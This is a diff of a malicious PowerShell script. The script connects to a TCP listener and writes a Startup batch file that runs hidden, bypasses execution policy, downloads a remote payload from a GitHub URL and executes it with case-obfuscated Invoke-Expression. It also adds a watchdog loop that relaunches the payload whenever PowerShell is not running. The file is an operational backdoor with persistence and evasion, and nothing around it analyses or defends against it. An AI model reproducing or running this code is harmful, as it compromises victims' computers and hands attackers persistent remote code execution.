@@ -1,6 +1,15 @@
 $client = New-Object System.Net.Sockets.TCPClient('192.168.0.122',553);
-cd '~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
+cd ~\AppData\Roaming\Microsoft\Windows\
+cd 'Start Menu'
 New-Item start.bat
-Set-Content start.bat 'powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | IEX'
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/keep.ps1" -OutFile keep.ps1
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay2.txt');
+Set-Content start.bat 'powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | iNvokE-EXPresSIon'
+New-Item kep.ps1
+Set-Content kep.ps1 '
+     while ($true) {                  
+         $Procs = Get-Process powershell -ErrorAction SilentlyContinue  
+         if (($procs).Count -eq 0) { 
+             Start-Sleep -Seconds (3 * 60)                  
+             Start-Process "~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"                     
+         }
+         Start-Sleep -Seconds 30 
+     }'
